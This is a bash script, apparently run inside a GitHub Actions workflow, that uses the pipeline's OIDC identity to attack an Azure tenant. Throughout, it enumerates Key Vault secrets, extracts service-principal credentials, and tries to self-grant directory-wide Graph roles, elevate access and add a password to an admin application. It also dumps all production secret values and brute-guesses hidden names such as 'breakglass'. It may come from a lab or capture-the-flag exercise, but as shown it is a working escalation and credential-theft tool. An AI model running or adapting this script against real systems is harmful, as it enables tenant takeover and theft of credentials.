#!/usr/bin/env bash
# (A) ARM control-plane secret NAMES in both vaults (Reader works even if data-plane 403)
# (B) sync-service Application.ReadWrite.All escalation: self-grant RoleManagement.ReadWrite.Directory
# (C) full raw kv-tbl-prod secret values + guessed hidden names
set +e
SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RG="rg-tbl-platform-prod-sea"; AUD="api://AzureADTokenExchange"
mint(){ curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
oidc(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=$1" | jq -r .access_token; }
spk(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$1" -d grant_type=client_credentials -d "client_secret=$2" --data-urlencode "scope=$3" | jq -r .access_token; }
MG=$(oidc "https://management.azure.com/.default"); KV=$(oidc "https://vault.azure.net/.default")
getsec(){ curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$1?api-version=7.4" | jq -r .value; }

echo "### A: ARM control-plane secret NAMES (names/attrs only, no values)"
for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
  echo "  -- $V --"
  curl -s -H "Authorization: Bearer $MG" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/$V/secrets?api-version=2023-07-01" \
    | jq -r 'if .value then (.value[]? | "   name="+(.name)+" enabled="+((.properties.attributes.enabled)|tostring)+" ct="+((.properties.contentType)//"-")+" tags="+((.tags)//{}|tostring)) else ("   ERR "+(.error.code//"?")) end'
done

echo "### B: sync-service Application.ReadWrite.All escalation attempts"
SS=$(getsec sync-service-principal); SA=$(echo "$SS"|jq -r .appId); SK=$(echo "$SS"|jq -r .clientSecret)
GT=$(spk "$SA" "$SK" "https://graph.microsoft.com/.default")
SSOID=70a07660-06bb-4396-b754-59fbad0b143e
GRAPHSP=$(curl -s -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/servicePrincipals(appId='00000003-0000-0000-c000-000000000000')?\$select=id" | jq -r .id)
echo "  graph SP oid=$GRAPHSP"
# try self-granting several high-value app roles
declare -A ROLES=( [RoleMgmtRW]=9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8 [AppRoleAssignmentRW]=06b708a9-e830-4db3-a914-8e69da51d44f [DirectoryRW]=19dbc75e-c2e2-444c-a770-ec69d8559fc7 [AppAdminRW]=1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9 )
for r in "${!ROLES[@]}"; do
  RID="${ROLES[$r]}"
  C=$(curl -s -o /tmp/ar -w '%{http_code}' -X POST -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
    "https://graph.microsoft.com/v1.0/servicePrincipals/$GRAPHSP/appRoleAssignedTo" \
    -d "{\"principalId\":\"$SSOID\",\"resourceId\":\"$GRAPHSP\",\"appRoleId\":\"$RID\"}")
  echo "  self-grant $r ($RID) -> $C $( [ "$C" != 201 ] && jq -r '.error.message' /tmp/ar | head -c 100)"
done
# try elevateAccess (would need User Access Admin at root)
echo "  elevateAccess -> $(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $MG" -H 'Content-Length: 0' "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01")"
# can sync-service add a password to the Owner-adjacent apps? (take over legacy-admin properly)
echo "  add password to legacy-admin app -> $(curl -s -o /tmp/pw -w '%{http_code}' -X POST -H "Authorization: Bearer $GT" -H 'Content-Type: application/json' "https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/addPassword" -d '{"passwordCredential":{"displayName":"x"}}') $(jq -r '.error.message//"(secret added)"' /tmp/pw | head -c 80)"

echo "### C: full raw kv-tbl-prod secret values + guessed names"
for s in sync-service-principal secrets-sync-principal cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal; do
  echo "  $s = $(curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$s?api-version=7.4" | jq -c '{value,tags,contentType}')"
done
for n in flag internal-config config-storage-connection storage-connection sync-token connection-string appcfg-key owner-credential breakglass; do
  R=$(curl -s -o /tmp/gg -w '%{http_code}' -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$n?api-version=7.4")
  [ "$R" = "200" ] && echo "  *** HIDDEN $n = $(jq -r .value /tmp/gg)"
done
echo "=== DONE ==="
